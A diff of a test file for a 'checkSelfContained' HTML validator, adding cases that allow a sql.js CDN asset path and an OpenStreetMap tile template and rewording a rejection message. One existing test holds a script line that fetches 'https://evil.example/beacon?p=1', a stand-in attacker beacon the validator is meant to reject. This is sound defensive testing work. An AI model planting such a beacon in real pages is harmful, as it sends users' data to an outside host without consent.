@@ -79,12 +79,28 @@ describe("checkSelfContained", () => {
     ).toEqual([]);
   });
 
+  it("passes the asset paths an allowed library builds for itself", () => {
+    expect(
+      errorsFor(
+        `<script>initSqlJs({ locateFile: (f) => "https://cdn.jsdelivr.net/npm/sql.js@1.14.2/dist/" + f });</script>`,
+      ),
+    ).toEqual([]);
+  });
+
+  it("passes a map tile template, which is filled in per tile", () => {
+    expect(
+      errorsFor(
+        `<script>L.tileLayer("https://tile.openstreetmap.org/{z}/{x}/{y}.png");</script>`,
+      ),
+    ).toEqual([]);
+  });
+
   it("rejects any other address a script builds at runtime", () => {
     expect(
       errorsFor(`<script>fetch("https://evil.example/beacon?p=1");</script>`),
     ).toMatchInlineSnapshot(`
       [
-        "page.html: a script reaches https://evil.example/beacon?p=1; only https://t0.gstatic.com may be built at runtime",
+        "page.html: a script reaches https://evil.example/beacon?p=1, which is not an address a script may build at runtime",
       ]
     `);
   });
